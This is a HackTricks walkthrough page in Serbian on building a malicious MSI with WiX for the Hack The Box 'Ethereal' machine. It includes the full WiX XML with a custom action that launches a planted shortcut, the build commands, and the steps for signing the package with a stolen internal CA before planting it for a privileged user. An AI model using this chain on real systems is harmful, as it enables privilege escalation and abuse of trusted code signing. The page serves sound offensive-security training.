# Kreiranje Custom-Action MSI-ja pomoću WiX-a

{{#include ../../banners/hacktricks-training.md}}

Ovaj istorijski Hack The Box chain koristio je WiX Toolset v3 za izradu MSI-ja koji je pokretao prethodno postavljeni `.lnk` fajl. **MSI nije automatski privilegovan**: izvršavanje se odvija u kontekstu koji određuju Windows Installer policy, atributi custom-action-a i korisnik koji ga instalira. U navedenom scenariju, attacker je takođe ukrao trusted signing CA i postavio potpisani MSI u folder koji je nadgledao drugi korisnik.<sup>[[1]](#references)[[3]](#references)</sup>

Za sveobuhvatno razumevanje primera upotrebe wix MSI-ja, preporučuje se da pogledate [ovu stranicu](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Ovde možete pronaći različite primere koji prikazuju upotrebu wix MSI-ja.<sup>[[2]](#references)</sup>

MSI pokreće `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. Originalni WiX v3 XML je sačuvan u nastavku:<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` deklariše minimalnu verziju Windows Installer-a, a `Compressed="yes"` označava da je paket kompresovan. `Stage1` je odložena radnja, ali ima `Impersonate="yes"`, pa se izvršava sa impersonacionim tokenom korisnika koji vrši instalaciju; do promene privilegija u ovom scenariju došlo je zato što je privilegovani korisnik kasnije otvorio MSI, a ne zato što taj atribut magično dodeljuje SYSTEM privilegije.<sup>[[3]](#references)</sup>

Kompajlirajte izvorni kod u WiX objekat pomoću `candle.exe`:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
Povežite taj objekat u MSI pomoću `light.exe`:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Korak potpisivanja korišćen u originalnom lancu

Ciljani tok rada prihvatao je pakete potpisane kompromitovanim internim CA. U opisu je izveden sertifikat za potpisivanje iz preuzetih datoteka `MyCA.cer`/`MyCA.pvk`, kreiran je PFX i potpisan MSI:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
Napadač je zatim postavio potpisani paket u `D:\DEV\MSIs` i sačekao da ga privilegovani workflow/korisnik izvrši. Zadržite taj preduslov prilikom prilagođavanja tehnike: bez privilegovanog puta instalacije, nesigurne politike kao što je `AlwaysInstallElevated` ili privilegovane žrtve, ovaj paket se izvršava samo sa pravima trenutnog korisnika.

## References

- [1] [Hack The Box - Ethereal: Kreiranje zlonamernog msi-ja i dobijanje root-a - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Kratak uvod: Kreiranje MSI instalera pomoću WiX-a - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Prilagođene akcije sa odloženim izvršavanjem (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
